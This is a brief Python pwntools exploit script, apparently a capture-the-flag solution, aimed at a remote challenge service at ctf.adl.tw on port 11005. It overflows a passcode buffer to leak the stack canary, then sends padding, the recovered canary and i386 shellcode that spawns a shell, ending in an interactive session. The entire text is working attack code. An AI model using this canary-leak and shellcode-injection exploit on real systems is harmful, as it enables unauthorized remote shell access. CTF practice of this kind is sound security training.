from pwn import *
context.arch = 'i386'
host = "ctf.adl.tw"
port = 11005
r = remote(host, port)
#r = process("./ANALYZER")
sh = asm(shellcraft.sh())
r.recvuntil(b'Enter your passcode:')
r.send(b"A"* 0x11)
print(r.recvuntil(b'\n'))
line = r.recv()[:4]
canary = u32(line) - 0x41
print(canary)
#print(r.recvuntil(b"Provide the result in CSV format:"))
attack = b"A" * 0x11  + p32(canary) + sh
r.send(attack)
print(r.recv())
r.interactive()